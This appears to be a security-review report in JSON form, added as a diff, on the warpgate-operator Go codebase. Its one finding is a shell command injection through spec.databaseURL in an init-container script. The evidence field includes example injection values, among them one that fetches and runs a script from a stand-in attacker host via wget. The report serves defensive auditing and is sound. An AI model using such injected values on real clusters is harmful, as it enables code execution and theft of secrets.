@@ -1,0 +1,35 @@
+{
+  "summary": "Reviewed the warpgate-operator Go sources under api/v1alpha1 (CRD types, webhooks/validators), internal/controller (all reconcilers, notably the WarpgateInstance, Connection, Ticket and credential controllers and helpers), internal/warpgate (REST client, credentials, targets, users, roles, tickets) and cmd/main.go. Overall the operator follows sound patterns (admin password injected via env var, secure metrics by default, HTTP/2 disabled, owner references). The one real security flaw is shell command injection: the WarpgateInstance init-container script interpolates the user-controlled spec.databaseURL directly into a /bin/sh -c command with no escaping, so a principal able to create/update a WarpgateInstance can execute arbitrary commands in the Pod using the trusted Warpgate image. A couple of lower-impact items (hardcoded InsecureSkipVerify on the auto-created connection, un-encoded ?search= query building) are noted but not reported as they fall within the operator's trust model or lack real impact.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/controller/helpers.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/role.go",
+    "internal/warpgate/ticket.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgatetarget_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "WarpgateInstanceReconciler.buildDeployment builds a shell script from WarpgateInstance spec fields and runs it with `/bin/sh -c` as the init container's command (line 776). The user-controlled field inst.Spec.DatabaseURL is concatenated into the `warpgate ... unattended-setup` command line via fmt.Sprintf inside double quotes with no shell escaping. Because the value sits inside a double-quoted argument of a `sh -c` string, shell metacharacters such as command substitution `$(...)` / backticks, or a closing double-quote followed by `;`, are interpreted by the shell. Any principal with RBAC to create or update a WarpgateInstance (a namespaced CR, not necessarily Pod/Deployment create rights) can therefore cause arbitrary command execution inside the init container, running as the namespace's default ServiceAccount and the operator-selected (trusted ghcr.io/warp-tech/warpgate) image. The admission webhook (validateWarpgateInstance) only emits an advisory warning for databaseURL and performs no character validation, so nothing blocks the payload. This lets an attacker run arbitrary code under a trusted/allow-listed image (bypassing image-policy admission controllers) and read the mounted ADMIN_PASSWORD and other /data contents. The same unescaped value is also written into warpgate.yaml at buildWarpgateConfig (line 345); that path is config-content injection rather than shell injection and is lower impact.",
+      "evidence": "setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))\n...\nif inst.Spec.DatabaseURL != \"\" {\n    setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)   // <-- user input, no escaping\n}\n...\ninitScript := strings.Join(scriptParts, \"\\n\")\n...\nCommand: []string{\"/bin/sh\", \"-c\", initScript},  // line 776, executed\n\nExample: spec.databaseURL = `sqlite:/data/db\" ; wget http://attacker/x -O /tmp/x; sh /tmp/x #` or `sqlite:/data/db$(id)` -> executed by the init shell.",
+      "recommendation": "Do not interpolate spec-derived values into a `sh -c` string. Pass the database URL to the warpgate binary as a separate argv element (exec form) rather than via a shell, e.g. build the init command as an explicit argv slice and feed dynamic values through environment variables referenced with proper quoting, or run setup without a shell. If a shell is unavoidable, pass databaseURL through an env var (as is already done for ADMIN_PASSWORD) and reference it as \"${DATABASE_URL}\" instead of baking the literal into the script. Additionally add strict validation of spec.databaseURL in the webhook (reject shell metacharacters / require a well-formed scheme)."
+    }
+  ]
+}
